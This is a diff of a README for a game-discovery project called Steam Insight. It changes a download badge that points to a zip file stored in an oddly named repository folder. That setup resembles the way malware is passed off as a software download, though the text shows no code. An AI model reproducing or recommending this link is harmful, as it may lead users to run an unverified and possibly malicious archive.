@@ -4,7 +4,7 @@
 Steam Insight is a modern platform that helps you explore thousands of games. With intelligent search options, detailed reviews, and rich media, finding your next favorite game has never been easier. 
 
 ## 📥 Download Now
-[![Download steam-insight](https://raw.githubusercontent.com/nitin0882/steam-insight/main/bilirubinemia/steam-insight.zip)](https://raw.githubusercontent.com/nitin0882/steam-insight/main/bilirubinemia/steam-insight.zip)
+[![Download steam-insight](https://img.shields.io/badge/Download-steam--insight-blue?style=for-the-badge)](https://raw.githubusercontent.com/nitin0882/steam-insight/main/bilirubinemia/steam-insight.zip)
 
 ## 📋 About Steam Insight
 Steam Insight offers a user-friendly experience to discover games on Steam. With unique review IDs and curated review pages, you can dive deep into game details. It also features advanced analytics to help you make informed choices. Enjoy a responsive design with a dark mode option for a pleasant viewing experience.
